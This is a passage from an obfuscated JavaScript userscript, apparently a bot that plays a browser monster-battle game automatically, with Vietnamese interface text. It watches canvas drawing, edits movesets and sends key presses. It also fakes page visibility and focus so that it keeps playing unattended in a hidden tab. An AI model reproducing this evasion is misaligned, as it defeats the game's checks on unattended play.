                        log(`chạy ${n ? `${n} ván` : _0xstr(0x706)}`);
                    },
                    pause() { state.on = false; applyDir(null); log(_0xstr(0x707)); },
                    resume() { state.on = true; log(_0xstr(0x708)); },
                    stop() { Object.assign(state, { on: false, target: 0, done: 0, started: false }); applyDir(null); log(_0xstr(0x709)); },
                };
                $(_0xstr(0x70a)).onclick = () => (state.on ? control.stop() : control.play());
                $(_0xstr(0x70b)).onclick = () => (state.on ? control.stop() : control.play());
                function renderCtl() {
                    const finished = state.target && state.done >= state.target;
                    $(_0xstr(0x70c)).textContent = state.on ? _0xstr(0x70d) : _0xstr(0x70e);
                    $(_0xstr(0x70f)).className = `psb-btn ${state.on ? _0xstr(0x710) : _0xstr(0x711)}`;
                    $(_0xstr(0x712)).className = `psb-dot${state.on ? _0xstr(0x713) : ''}`;
                    $(_0xstr(0x714)).textContent = state.on ? _0xstr(0x715) : _0xstr(0x716);
                    $(_0xstr(0x717)).classList.toggle(_0xstr(0x718), state.on);
                    if ($(_0xstr(0x719)))
                        $(_0xstr(0x71a)).textContent = !window.G ? _0xstr(0x71b) : `Đọc game: có${SITE.pilot.active() ? ` · ${SITE.pilot.mode() || _0xstr(0x71c)}` : ''}`;
                    if ($(_0xstr(0x71d))) {
                        const s = SITE.pilot.suggestion();
                        if ($(_0xstr(0x71e)).textContent !== s)
                            $(_0xstr(0x71f)).textContent = s;
                        $(_0xstr(0x720)).style.display = s ? '' : _0xstr(0x721);
                    }
                    const acts = state.halt && !state.on && state.haltActions;
                    if ($(_0xstr(0x722)).acts !== acts) {
                        $(_0xstr(0x723)).acts = acts;
                        $(_0xstr(0x724)).innerHTML = (acts || []).map((a, i) => `<button data-act="${i}" class="psb-btn info" title="${a.title || ''}">${a.label}</button>`).join('');
                        $(_0xstr(0x725)).style.display = acts ? '' : _0xstr(0x726);
                    }
                    RUN_OPTS.forEach(o => { const sel = ctl.querySelector(`[data-run="${o.key}"]`); if (sel !== document.activeElement && sel.value !== o.get())
                        sel.value = o.get(); });
                    const blind = !state.frameAt && performance.now() - bootAt > 8000;
                    $(_0xstr(0x727)).textContent = (blind ? _0xstr(0x728) : '')
                        + (state.halt && !state.on ? `⚠ ${state.halt} ` : '')
                        + (finished ? `Đã xong ${state.done}/${state.target} ván`
                            : !state.started && !state.on ? _0xstr(0x729) : `${state.on ? _0xstr(0x72a) : _0xstr(0x72b)} · ván ${state.done + 1}${state.target ? `/${state.target}` : _0xstr(0x72c)}`);
                }
                const MOVES = SITE.moveTable || window.PSBotMoves || { moves: [], mons: {} };
                const moveByName = new Map();
                let movesRead = 0;
                const moveOf = n => {
                    for (; movesRead < MOVES.moves.length; movesRead++)
                        moveByName.set(MOVES.moves[movesRead].name.toLowerCase(), MOVES.moves[movesRead]);
                    return moveByName.get(n);
                };
                const evolveNeeds = SITE.evolveNeeds || new Map(MOVES.moves.filter(m => m.evo).map(m => [m.name.toLowerCase(), m.evo]));
                const tmMoves = name => (SITE.id === _0xstr(0x72d) && MOVES.tm && MOVES.tm[name.toLowerCase()] || []).map(i => MOVES.moves[i]);
                const monByDex = Object.fromEntries(Object.entries(MOVES.dex || {}).map(([n, d]) => [d, n]));
                function gameSave() {
                    let best = null;
                    try {
                        for (let i = 0; i < localStorage.length; i++) {
                            const k = localStorage.key(i);
                            if (!/^ps\.(cloud|save)\./.test(k))
                                continue;
                            const s = JSON.parse(localStorage.getItem(k));
                            if (s && typeof s === _0xstr(0x72e) && (!best || (s.updated || 0) > (best.updated || 0)))
                                best = s;
                        }
                    }
                    catch { }
                    return SITE.id === _0xstr(0x72f) ? best : null;
                }
                const taughtTms = name => {
                    const s = gameSave(), ids = (s && s.ptm && s.ptm[(MOVES.dex || {})[name.toLowerCase()]]) || [];
                    return new Set(MOVES.moves.filter(m => ids.includes(m.id)).map(m => m.name));
                };
                function learnsetOf(name) {
                    const n = name.toLowerCase(), game = SITE.learnset && SITE.learnset(n);
                    if (game)
                        return game;
                    const natural = (MOVES.mons[n] || []).map(i => MOVES.moves[i]).filter(Boolean);
                    if (!natural.length)
                        return null;
                    const tms = tmMoves(n), taught = taughtTms(n);
                    return { natural, taught: tms.filter(m => taught.has(m.name)), tms: tms.filter(m => !taught.has(m.name)) };
                }
                const currentMon = () => [...state.hudTexts].map(t => t.toLowerCase()).find(t => MOVES.mons[t] || learnsetOf(t))
                    || (SITE.partnerName && SITE.partnerName()) || monByDex[(gameSave() || {}).partner] || '';
                const ms = document.createElement(_0xstr(0x730));
                ms.dataset.psbotUi = ms.dataset.psbotMs = '';
                ms.className = _0xstr(0x731);
                ms.style.cssText = _0xstr(0x732);
                ms.innerHTML = `
    <div data-drag class="psb-head" style="${dragCss}" title="Kéo để di chuyển"><span data-ms="title" class="psb-title">Moveset</span>
      <button data-ms="edit" class="psb-icon" style="font-size:14px" title="Sửa build của pokémon khác">✎</button><span data-ms="close" class="psb-icon" style="font-size:14px">✕</span></div>
    <div class="psb-body">
      <div data-ms="pick" style="display:flex;flex-direction:column;gap:8px">
        <div class="psb-sec">Pokémon</div>
        <div class="psb-row"><input data-ms="mon" class="psb-in" list="psbot-mons" placeholder="Tên pokémon hoặc bấm 🎯" style="flex:1;min-width:0">
          <button data-ms="cur" class="psb-btn info" style="flex:0 0 auto" title="Bật: tên và danh sách move tự đổi theo pokémon đang chơi (trong trận: tên trên HUD; ở menu: partner). Tự gõ tên thì tắt">🎯 Đang chơi</button></div>
        <datalist id="psbot-mons"></datalist>
      </div>
      <div class="psb-sec">4 move ưu tiên</div>
      <div data-ms="slots" style="display:flex;flex-direction:column;gap:5px"></div>
      <div class="psb-row">
        <button data-ms="save" class="psb-btn go">Lưu</button>
        <button data-ms="del" class="psb-btn stop">Xoá build</button></div>
      <div data-ms="msg" class="psb-muted"></div>
      <div data-ms="list" class="psb-muted" style="max-height:120px;overflow:auto"></div>
    </div>`;
                dock.append(ms);
                draggable(ms, _0xstr(0x733));
                UI_EVENTS.forEach(t => ms.addEventListener(t, e => e.stopPropagation()));
                const $m = k => ms.querySelector(`[data-ms="${k}"]`);
                const moveLabel = m => `${m.name} · ${m.cat === _0xstr(0x734) ? _0xstr(0x735) : `${m.kind} ${m.dmg ?? _0xstr(0x736)}dmg/${m.cd ?? _0xstr(0x737)}s`}`;
                function renderMoveset() {
                    const name = $m(_0xstr(0x738)).value.trim().toLowerCase(), made = !CFG.builds[name] && autoBuild(name), build = CFG.builds[name] || made || [];
                    const ls = learnsetOf(name) || { natural: [], taught: [], tms: [] }, natural = ls.natural;
                    const opt = (m, i, mark) => `<option value="${m.name}" ${build[i] === m.name ? _0xstr(0x739) : ''}>${mark}${moveLabel(m)}</option>`;
                    const tmGroups = i => [[ls.taught, _0xstr(0x73a), _0xstr(0x73b)], [ls.tms, `TM chưa dạy (mua ở ${SITE.id === _0xstr(0x73c) ? _0xstr(0x73d) : _0xstr(0x73e)})`, _0xstr(0x73f)]]
                        .filter(([l]) => l.length).map(([l, label, mark]) => `<optgroup label="${label}">${l.map(m => opt(m, i, mark)).join('')}</optgroup>`).join('');
                    const listed = new Set([...natural, ...ls.taught, ...ls.tms].map(m => m.name));
                    const extra = i => build[i] && !listed.has(build[i]) ? `<option value="${build[i]}" selected>${build[i]}</option>` : '';
                    $m(_0xstr(0x740)).innerHTML = natural.length ? [0, 1, 2, 3].map(i => `<label class="psb-row"><span class="psb-muted" style="width:18px">#${i + 1}</span>
      <select data-slot class="psb-in" style="flex:1;min-width:0"><option value="">(trống)</option>${extra(i)}${natural.map((m, j) => opt(m, i, j ? '' : _0xstr(0x741))).join('')}${tmGroups(i)}</select></label>`).join('')
                        : `<div style="color:#ff9a9a">${name ? _0xstr(0x742) : _0xstr(0x743)}</div>`;
                    const saved = Object.entries(CFG.builds).filter(([n, b]) => !isDefaultBuild(n, b));
                    const note = (natural.length ? _0xstr(0x744) : '')
                        + (made ? _0xstr(0x745) : build.length && isDefaultBuild(name, build) ? _0xstr(0x746) : '');
                    const playing = follow && name && name === currentMon();
                    $m(_0xstr(0x747)).style.display = playing ? _0xstr(0x748) : '';
                    $m(_0xstr(0x749)).style.display = playing ? '' : _0xstr(0x74a);
                    $m(_0xstr(0x74b)).textContent = playing ? `Moveset · ${name.replace(/(^|[\s-])\S/g, c => c.toUpperCase())}` : _0xstr(0x74c);
                    $m(_0xstr(0x74d)).innerHTML = playing
                        ? (made ? _0xstr(0x74e) : isDefaultBuild(name, build) ? _0xstr(0x74f) : CFG.builds[name] ? _0xstr(0x750) : '')
                        : note + (saved.length ? _0xstr(0x751) + saved.map(([n, b]) => `<a data-load="${n}" style="color:var(--psb-acc,#4da3ff);cursor:pointer;text-decoration:underline" title="${b.join(_0xstr(0x752))}">${n}</a>`).join(_0xstr(0x753)) : _0xstr(0x754));
                }
                let follow = true;
                const setFollow = on => { follow = on; $m(_0xstr(0x755)).classList.toggle(_0xstr(0x756), on); $m(_0xstr(0x757)).classList.toggle(_0xstr(0x758), !on); };
                function followMoveset() {
                    const editing = ms.contains(document.activeElement) && /^(SELECT|INPUT)$/.test(document.activeElement.tagName);
                    if (!follow || ms.style.display === _0xstr(0x759) || editing)
                        return;
                    const mon = currentMon();
                    if (mon && mon !== $m(_0xstr(0x75a)).value.trim().toLowerCase()) {
                        $m(_0xstr(0x75b)).value = mon;
                        $m(_0xstr(0x75c)).textContent = '';
                        renderMoveset();
                    }
                }
                function openMoveset() {
                    const show = ms.style.display === _0xstr(0x75d);
                    ms.style.display = show ? _0xstr(0x75e) : _0xstr(0x75f);
                    if (show)
                        besidePanel(ms, _0xstr(0x760));
                    const dl = ms.querySelector(_0xstr(0x761)), mons = Object.keys(MOVES.mons);
                    if (show && dl.children.length !== mons.length)
                        dl.innerHTML = mons.map(n => `<option value="${n.replace(/"/g, _0xstr(0x762))}">`).join('');
                    if (show) {
                        if (follow || !$m(_0xstr(0x763)).value)
                            $m(_0xstr(0x764)).value = currentMon() || $m(_0xstr(0x765)).value;
                        $m(_0xstr(0x766)).textContent = '';
                        renderMoveset();
                    }
                }
                $(_0xstr(0x767)).onclick = openMoveset;
                $m(_0xstr(0x768)).onclick = openMoveset;
                $m(_0xstr(0x769)).oninput = () => { setFollow(false); renderMoveset(); };
                $m(_0xstr(0x76a)).onclick = () => { setFollow(false); renderMoveset(); $m(_0xstr(0x76b)).focus(); $m(_0xstr(0x76c)).select(); };
                $m(_0xstr(0x76d)).onclick = () => { setFollow(true); $m(_0xstr(0x76e)).value = currentMon(); $m(_0xstr(0x76f)).textContent = currentMon() ? '' : _0xstr(0x770); renderMoveset(); };
                setFollow(true);
                $m(_0xstr(0x771)).onclick = () => {
                    const name = $m(_0xstr(0x772)).value.trim();
                    const moves = [...new Set(PSBotList(ms.querySelectorAll(_0xstr(0x773))).map(s => s.value).filter(Boolean))];
                    const ls = learnsetOf(name);
                    if (!ls || !moves.length)
                        return void ($m(_0xstr(0x774)).textContent = _0xstr(0x775));
                    window.PSBot.setBuild(name, moves);
                    const untaught = ls.tms.filter(m => moves.includes(m.name)).map(m => m.name);
                    $m(_0xstr(0x776)).textContent = `Đã lưu ${name}: ${moves.join(_0xstr(0x777))}` + (untaught.length ? ` · chưa dạy TM ${untaught.join(_0xstr(0x778))}: game chưa đưa thẻ này` : '');
                    renderMoveset();
                };
                $m(_0xstr(0x779)).onclick = () => {
                    const name = $m(_0xstr(0x77a)).value.trim();
                    if (!CFG.builds[name.toLowerCase()])
                        return;
                    window.PSBot.setBuild(name, []);
                    $m(_0xstr(0x77b)).textContent = `Đã xoá build ${name}`;
                    renderMoveset();
                };
                $m(_0xstr(0x77c)).onclick = e => { const a = e.target.closest(_0xstr(0x77d)); if (a) {
                    setFollow(false);
                    $m(_0xstr(0x77e)).value = a.dataset.load;
                    renderMoveset();
                } };
                function orderPopup({ key, title, intro, set, labels, line, defaultMsg, button }) {
                    const el = document.createElement(_0xstr(0x77f));
                    el.dataset.psbotUi = el.dataset.psbotOrder = '';
                    el.className = _0xstr(0x780);
                    el.style.cssText = _0xstr(0x781);
                    el.innerHTML = `
      <div data-drag class="psb-head" style="${dragCss}" title="Kéo để di chuyển"><span class="psb-title">${title}</span>
        <button data-o="close" class="psb-icon" style="font-size:14px">✕</button></div>
      <div class="psb-body">
        <div class="psb-muted">${intro}</div>
        <div data-o="rows" style="display:flex;flex-direction:column;gap:2px;max-height:360px;overflow:auto"></div>
        <div class="psb-row"><button data-o="reset" class="psb-btn">Mặc định</button></div>
        <div data-o="msg" class="psb-muted"></div>
      </div>`;
                    dock.append(el);
                    const posKey = `psbot.pos.${key}`;
                    draggable(el, posKey);
                    UI_EVENTS.forEach(t => el.addEventListener(t, e => e.stopPropagation()));
                    const $o = k => el.querySelector(`[data-o="${k}"]`);
                    function render() {
                        let rank = 0;
                        const order = set.order;
                        $o(_0xstr(0x782)).innerHTML = order.map((id, i) => {
                            const isLine = id === line;
                            return `<div class="psb-row" style="padding:1px 0${isLine ? _0xstr(0x783) : ''}">
          <span class="psb-muted" style="width:24px;text-align:right">${isLine ? '' : `#${++rank}`}</span><span style="flex:1;min-width:0">${labels[id]}</span>
          <button data-move="${i},-1" class="psb-icon" ${i ? '' : _0xstr(0x784)}>↑</button><button data-move="${i},1" class="psb-icon" ${i < order.length - 1 ? '' : _0xstr(0x785)}>↓</button></div>`;
                        }).join('');
                        $o(_0xstr(0x786)).textContent = order === set.defaults ? defaultMsg : _0xstr(0x787);
                    }
                    const save = order => { set.save(order); render(); };
                    button.onclick = $o(_0xstr(0x788)).onclick = () => {
                        const show = el.style.display === _0xstr(0x789);
                        el.style.display = show ? _0xstr(0x78a) : _0xstr(0x78b);
                        if (show) {
                            besidePanel(el, posKey);
                            render();
                        }
                    };
                    $o(_0xstr(0x78c)).onclick = e => {
                        const b = e.target.closest(_0xstr(0x78d));
                        if (!b)
                            return;
                        const [i, d] = b.dataset.move.split(_0xstr(0x78e)).map(Number), order = [...set.order];
                        [order[i], order[i + d]] = [order[i + d], order[i]];
                        save(order);
                    };
                    $o(_0xstr(0x78f)).onclick = () => save(null);
                    return el;
                }
                const lv = orderPopup({
                    key: _0xstr(0x790), title: _0xstr(0x791), set: lvSet, line: _0xstr(0x792), button: $(_0xstr(0x793)),
                    intro: _0xstr(0x794),
                    labels: Object.fromEntries(LV_ROWS.map(([id, , label]) => [id, label])),
                    defaultMsg: _0xstr(0x795),
                });
                const it = orderPopup({
                    key: _0xstr(0x796), title: _0xstr(0x797), set: itemSet, line: _0xstr(0x798), button: $(_0xstr(0x799)),
                    intro: _0xstr(0x79a),
                    labels: Object.fromEntries(ITEM_ROWS.map(([id, label]) => [id, label])),
                    defaultMsg: _0xstr(0x79b),
                });
                function toggleCatalog() { panel.style.display = panel.style.display === _0xstr(0x79c) ? _0xstr(0x79d) : _0xstr(0x79e); renderPanel(); }
                const catalog = new Map();
                function collect(frame) {
                    const now = performance.now();
                    const groups = new Map();
                    for (const d of frame) {
                        if (!SITE.isWorld(d))
                            continue;
                        let g = groups.get(d.src);
                        if (!g)
                            groups.set(d.src, g = []);
                        g.push({ x: (d.x - d.e) / d.s, y: (d.y - d.f) / d.s, d });
                    }
                    for (const [src, list] of groups) {
                        let c = catalog.get(src);
                        if (!c) {
                            const d = list[0].d;
                            catalog.set(src, c = { src, img: d.img, rect: d.rect, w: Math.round(Math.abs(d.w / d.s)), h: Math.round(Math.abs(d.h / d.s)), max: 0, frames: 0, speed: 0, prev: null });
                        }
                        c.max = Math.max(c.max, list.length);
                        c.frames++;
                        c.lastSeen = now;
                        if (c.prev && list.length <= 40) {
                            let sum = 0, n = 0;
                            for (const p of list) {
                                let best = Infinity;
                                for (const q of c.prev)
                                    best = Math.min(best, Math.hypot(p.x - q.x, p.y - q.y));
                                if (best < 60) {
                                    sum += best;
                                    n++;
                                }
                            }
                            if (n)
                                c.speed = c.speed * 0.9 + (sum / n) * 0.1;
                        }
                        c.prev = list.length <= 40 ? list : null;
                    }
                }
                const catalogRows = () => {
                    const now = performance.now(), live = c => now - c.lastSeen < 1500, enemy = c => CFG.enemyRe.test(c.src);
                    return [...catalog.values()].sort((a, b) => enemy(a) - enemy(b) || live(b) - live(a) || a.max - b.max);
                };
                const thumbs = new Map();
                function thumb(c) {
                    if (thumbs.has(c.src))
                        return thumbs.get(c.src);
                    let url = '';
                    const color = c.src.match(/^(?:fill|stroke):(.+)$/);
                    if (color) {
                        const t = document.createElement(_0xstr(0x79f));
                        t.width = t.height = 24;
                        const tc = t.getContext(_0xstr(0x7a0));
                        tc.fillStyle = color[1].replace(/^gradient:?/, '') || _0xstr(0x7a1);
                        pathOrig.fillRect.call(tc, 0, 0, 24, 24);
                        url = t.toDataURL();
                    }
                    else if (c.img) {
                        try {
                            const t = document.createElement(_0xstr(0x7a2));
                            const [sx, sy, sw, sh] = c.rect || [0, 0, c.img.width, c.img.height];
                            const k = Math.min(40 / sw, 40 / sh, 4);
                            t.width = Math.max(1, sw * k);
                            t.height = Math.max(1, sh * k);
                            const tc = t.getContext(_0xstr(0x7a3));
                            tc.imageSmoothingEnabled = false;
                            origDraw.call(tc, c.img, sx, sy, sw, sh, 0, 0, t.width, t.height);
                            url = t.toDataURL();
                        }
                        catch { }
                    }
                    thumbs.set(c.src, url);
                    return url;
                }
                const panel = document.createElement(_0xstr(0x7a4));
                panel.dataset.psbotUi = '';
                panel.style.cssText = _0xstr(0x7a5);
                dock.append(panel);
                draggable(panel, _0xstr(0x7a6));
                const TAG_LABEL = { good: [_0xstr(0x7a7), _0xstr(0x7a8)], hazard: [_0xstr(0x7a9), _0xstr(0x7aa)], rift: [_0xstr(0x7ab), _0xstr(0x7ac)], wall: [_0xstr(0x7ad), _0xstr(0x7ae)], buff: [_0xstr(0x7af), _0xstr(0x7b0)], xp: [_0xstr(0x7b1), _0xstr(0x7b2)], case: [_0xstr(0x7b3), _0xstr(0x7b4)], break: [_0xstr(0x7b5), _0xstr(0x7b6)], heal: [_0xstr(0x7b7), _0xstr(0x7b8)], safe: [_0xstr(0x7b9), _0xstr(0x7ba)] };
                function renderPanel() {
                    if (panel.style.display === _0xstr(0x7bb))
                        return;
                    const now = performance.now();
                    const esc = s => s.replace(/[&<>"]/g, ch => `&#${ch.charCodeAt(0)};`);
                    panel.innerHTML = `<div data-drag style="padding:6px;border-bottom:1px solid #345;${dragCss}" title="Kéo để di chuyển">Danh mục sprite (F6 đóng) · rê chuột = khoanh trên màn hình · <b>đậm</b> = đang có trên màn
      <button data-export style="font:10px monospace;padding:1px 6px;margin-left:4px;background:#2a5;color:#000;border:1px solid #456;border-radius:3px;cursor:pointer" title="Tải data.js (nhãn + build) — chép đè vào sites/${SITE.id}/">Xuất data.js</button></div>` +
                        catalogRows().map(c => {
                            const t = tagOf(c.src) || (/^(fill|stroke):/.test(c.src) && CFG.autoTelegraph && isTelegraph(c) ? _0xstr(0x7bc) : undefined);
                            const live = now - c.lastSeen < 1500, enemy = CFG.enemyRe.test(c.src);
                            const btn = (v, label, color) => `<button data-src="${esc(c.src)}" data-tag="${v}" style="font:10px monospace;padding:1px 4px;margin-right:2px;background:${t === v ? color : _0xstr(0x7bd)};color:${t === v ? _0xstr(0x7be) : _0xstr(0x7bf)};border:1px solid #456;border-radius:3px;cursor:pointer">${label}</button>`;
                            return `<div data-row="${esc(c.src)}" style="display:flex;gap:6px;align-items:center;padding:4px 6px;border-bottom:1px solid #223;${live ? _0xstr(0x7c0) : _0xstr(0x7c1)}">
          <div style="width:40px;height:40px;display:flex;align-items:center;justify-content:center;background:#000">${thumb(c) ? `<img src="${thumb(c)}" style="image-rendering:pixelated;max-width:40px;max-height:40px">` : _0xstr(0x7c2)}</div>
          <div style="flex:1;min-width:0">
            <div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(c.src)}">${esc(c.src)}</div>
            <div style="color:#9ab">${c.w}×${c.h} · tối đa ${c.max}/frame · ${c.speed > 1 ? `di chuyển ${c.speed.toFixed(1)}` : _0xstr(0x7c3)}${enemy ? _0xstr(0x7c4) : ''}</div>
            <div style="margin-top:2px">${Object.entries(TAG_LABEL).map(([v, [l, col]]) => btn(v, l, col)).join('')}${btn('', _0xstr(0x7c5), _0xstr(0x7c6))}</div>
          </div></div>`;
                        }).join('');
                }
                UI_EVENTS.forEach(t => panel.addEventListener(t, e => e.stopPropagation()));
                panel.addEventListener(_0xstr(0x7c7), e => {
                    if (e.target.closest(_0xstr(0x7c8)))
                        return void window.PSBot.exportConfig();
                    const b = e.target.closest(_0xstr(0x7c9));
                    if (!b)
                        return;
                    if (b.dataset.tag)
                        CFG.tags[b.dataset.src] = b.dataset.tag;
                    else {
                        delete CFG.tags[b.dataset.src];
                        delete CFG.tags[b.dataset.src.split(_0xstr(0x7ca))[0]];
                    }
                    saveTags();
                    renderPanel();
                });
                panel.addEventListener(_0xstr(0x7cb), e => { const r = e.target.closest(_0xstr(0x7cc)); state.highlight = r ? r.dataset.row : null; });
                panel.addEventListener(_0xstr(0x7cd), () => { state.highlight = null; });
                const onFullscreen = () => {
                    const fs = document.fullscreenElement || document.webkitFullscreenElement;
                    const host = fs && fs.tagName !== _0xstr(0x7ce) ? fs : document.body;
                    for (const el of [ov, dock, ...[ms, panel].filter(el => !dock.contains(el))])
                        if (el.parentNode !== host)
                            host.append(el);
                };
                document.addEventListener(_0xstr(0x7cf), onFullscreen);
                document.addEventListener(_0xstr(0x7d0), onFullscreen);
                onFullscreen();
                const nativeRAF = window.requestAnimationFrame, nativeCAF = window.cancelAnimationFrame;
                const visDesc = { hidden: Object.getOwnPropertyDescriptor(document, _0xstr(0x7d1)), visibilityState: Object.getOwnPropertyDescriptor(document, _0xstr(0x7d2)) };
                const origHasFocus = document.hasFocus;
                const swallow = e => { if (CFG.background)
                    e.stopImmediatePropagation(); };
                let bgWorker = null;
                if (CFG.background) {
                    [_0xstr(0x7d3), _0xstr(0x7d4), _0xstr(0x7d5), _0xstr(0x7d6), _0xstr(0x7d7)].forEach(t => window.addEventListener(t, swallow, true));
                    Object.defineProperty(document, _0xstr(0x7d8), { get: () => false, configurable: true });
                    Object.defineProperty(document, _0xstr(0x7d9), { get: () => _0xstr(0x7da), configurable: true });
                    document.hasFocus = () => true;
                    const pending = new Map();
                    let seq = 0;
                    const run = id => { const p = pending.get(id); if (!p)
                        return; pending.delete(id); nativeCAF.call(window, p.native); p.cb(performance.now()); };
                    window.requestAnimationFrame = cb => {
                        const id = ++seq;
                        pending.set(id, { cb, at: performance.now(), native: nativeRAF.call(window, () => run(id)) });
                        return id;
                    };
                    window.cancelAnimationFrame = id => { const p = pending.get(id); if (p) {
                        nativeCAF.call(window, p.native);
                        pending.delete(id);
                    } };
                    const fallback = () => { const now = performance.now(); for (const [id, p] of [...pending])
                        if (now - p.at > 40)
                            run(id); };
                    const noWorker = err => {
                        log(_0xstr(0x7db), err);
                        bgWorker = { terminate: clearInterval.bind(null, setInterval(fallback, 16)) };
                    };
                    try {
                        if (window.__psbotSandbox)
                            bgWorker = { terminate: clearInterval.bind(null, setInterval(fallback, 16)) };
                        else {
                            bgWorker = new Worker(URL.createObjectURL(new Blob([_0xstr(0x7dc)], { type: _0xstr(0x7dd) })));
                            bgWorker.onmessage = fallback;
                            bgWorker.onerror = e => { bgWorker.terminate(); noWorker(e.message || _0xstr(0x7de)); };
                        }
                    }
                    catch (err) {
                        noWorker(err);
                    }
                }
                const origRAF = window.requestAnimationFrame.bind(window);
                let running = true, lastResend = 0, lastPanel = 0, lastFollow = 0;
                const bootAt = performance.now();
                function loop(t) {
                    if (!running)
                        return;
                    canvas = SITE.canvas() || canvas;
                    const frame = state.frame;
                    state.frame = [];
                    if (state.texts.length) {
                        state.hudTexts = new Set(state.texts);
                        state.texts = [];
                        const timer = [...state.hudTexts].find(x => /^\d+:\d\d$/.test(x));
                        if (timer)
                            state.lastTimer = t;
                        if (timer !== state.timerText) {
                            state.timerText = timer;
                            state.timerChangedAt = t;
                        }
                        const hp = [...state.hudTexts].map(x => x.match(/^(\d+) \/ (\d+)$/)).find(Boolean);
                        if (hp)
                            state.hpRatio = hp[1] / Math.max(1, hp[2]);
                        if ([...state.hudTexts].some(t => /^0:0[0-2]$/.test(t))) {
                            state.picks = {};
                            state.newSkills = 0;
                            state.walls = [];
                            state.path = null;
                            state.selfVotes = {};
                        }
                        state.dead = [...state.hudTexts].some(x => /^spectat/i.test(x) || /^0 \/ \d+$/.test(x));
                    }
                    if (frame.length) {
                        state.frameAt = t;
                        state.lastFrame = frame;
                        collect(frame);
                        tick(frame);
                    }
                    if (t - lastPanel > 1000 && !panel.matches(_0xstr(0x7df))) {
                        lastPanel = t;
                        renderPanel();
                    }
                    renderCtl();
                    if (t - lastFollow > 500) {
                        lastFollow = t;
                        followMoveset();
                    }
                    levelUp();
                    dialogPick();
                    if (SITE.pilot)
                        SITE.pilot.tick();
                    useItems(t);
                    swapSkills(t);
                    autoRestart(t);
                    if (state.on && t - lastResend > 400) {
                        lastResend = t;
                        Object.keys(KEYS).forEach(k => state.keys[k] && sendKey(_0xstr(0x7e0), ...KEYS[k]));
                    }
                    draw();
                    origRAF(loop);
                }
                origRAF(loop);
                const tag = { on: false, pending: null, box: null };
                const TAGS = { Digit1: _0xstr(0x7e1), Digit2: _0xstr(0x7e2), Digit3: _0xstr(0x7e3), Digit4: _0xstr(0x7e4), Digit5: _0xstr(0x7e5), Digit6: _0xstr(0x7e6), Digit7: _0xstr(0x7e7), Digit8: _0xstr(0x7e8), Digit9: _0xstr(0x7e9) };
                const onClick = e => {
                    if (!tag.on || !e.isTrusted)
                        return;
                    const r = canvas.getBoundingClientRect();
                    const x = (e.clientX - r.left) * canvas.width / r.width, y = (e.clientY - r.top) * canvas.height / r.height;
                    const hit = state.lastFrame
                        .filter(d => SITE.isWorld(d) && Math.abs(d.x - x) <= Math.abs(d.w) / 2 + 4 && Math.abs(d.y - y) <= Math.abs(d.h) / 2 + 4)
                        .sort((a, b) => Math.abs(a.w * a.h) - Math.abs(b.w * b.h))[0];
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    tag.pending = hit ? hit.src : null;
                    tag.box = hit || null;
                    log(hit ? `chọn ${hit.src} (nhãn hiện tại: ${tagOf(hit.src) || _0xstr(0x7ea)})` : _0xstr(0x7eb));
                };
                window.addEventListener(_0xstr(0x7ec), onClick, true);
                const onKey = e => {
                    if (!e.isTrusted)
                        return;
                    if (e.code === _0xstr(0x7ed)) {
                        tag.on = !tag.on;
                        tag.pending = tag.box = null;
                        if (tag.on) {
                            state.on = false;
                            applyDir(null);
                        }
                        e.preventDefault();
                    }
                    if (tag.on && tag.pending && (TAGS[e.code] || e.code === _0xstr(0x7ee) || e.code === _0xstr(0x7ef))) {
                        if (TAGS[e.code])
                            CFG.tags[tag.pending] = TAGS[e.code];
                        else if (e.code === _0xstr(0x7f0))
                            delete CFG.tags[tag.pending];
                        if (e.code !== _0xstr(0x7f1)) {
                            saveTags();
                            log(`${tag.pending} → ${CFG.tags[tag.pending] || _0xstr(0x7f2)}`);
                        }
                        tag.pending = tag.box = null;
                        e.preventDefault();
                        e.stopImmediatePropagation();
                    }
                    if (e.code === _0xstr(0x7f3)) {
                        state.on = !state.on;
                        if (!state.on)
                            applyDir(null);
                        log(_0xstr(0x7f4), state.on ? _0xstr(0x7f5) : _0xstr(0x7f6));
                        e.preventDefault();
                    }
                    if (e.code === _0xstr(0x7f7)) {
                        state.debug = !state.debug;
                        e.preventDefault();
                    }
                    if (e.code === _0xstr(0x7f8)) {
                        toggleCatalog();
                        e.preventDefault();
                    }
                };
                window.addEventListener(_0xstr(0x7f9), onKey, true);
                window.PSBot = {
                    CFG, state, ctl, SITE,
                    version: VERSION,
                    play(n) { if (n !== undefined)
                        $(_0xstr(0x7fa)).value = n; control.play(); },
                    pause: () => control.pause(), resume: () => control.resume(), stop: () => control.stop(),
                    sources() {
                        const by = {};
                        state.lastFrame.forEach(d => { (by[d.src] ||= []).push([Math.round(d.x), Math.round(d.y)]); });
                        console.table(Object.entries(by).map(([src, pts]) => ({ src, tag: tagOf(src) || '', n: pts.length, sample: JSON.stringify(pts.slice(0, 3)) })));
                    },
                    catalog() {
                        const rows = catalogRows().map(c => ({ src: c.src, tag: tagOf(c.src) || '', max: c.max, size: `${c.w}x${c.h}`, moving: c.speed.toFixed(1), seenSec: Math.round(c.frames / 60) }));
                        console.table(rows);
                        try {
                            copy(JSON.stringify(rows));
                            log(_0xstr(0x7fb));
                        }
                        catch { }
                    },
                    tags() { console.table(CFG.tags); },
                    setBuild(name, moves) {
                        userBuilds[name.toLowerCase()] = moves;
                        if (moves.length)
                            CFG.builds[name.toLowerCase()] = moves;
                        else
                            delete CFG.builds[name.toLowerCase()];
                        try {
                            const saved = JSON.parse(localStorage.getItem(BUILD_KEY) || _0xstr(0x7fc));
                            saved[name.toLowerCase()] = moves;
                            localStorage.setItem(BUILD_KEY, JSON.stringify(saved));
                        }
                        catch { }
                        log(_0xstr(0x7fd), name, moves);
                    },
                    resetTags() { CFG.tags = {}; saveTags(); },
                    exportConfig() {
                        const builds = Object.fromEntries(Object.keys({ ...defaultBuilds, ...CFG.builds }).map(n => [n, CFG.builds[n] || []]).filter(([n, b]) => !isDefaultBuild(n, b)));
                        const json = JSON.stringify({ tags: CFG.tags, builds }, null, 2);
                        const src = _0xstr(0x7fe) +
                            `// Tạo lại file này bằng nút "Xuất data.js" trong bảng F6 (hoặc PSBot.exportConfig()), rồi chép đè vào sites/${SITE.id}/.\n` +
                            `window.PSBotData = ${json};\n`;
                        const a = document.createElement(_0xstr(0x7ff));
                        a.href = URL.createObjectURL(new Blob([src], { type: _0xstr(0x800) }));
                        a.download = _0xstr(0x801);
                        a.click();
                        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
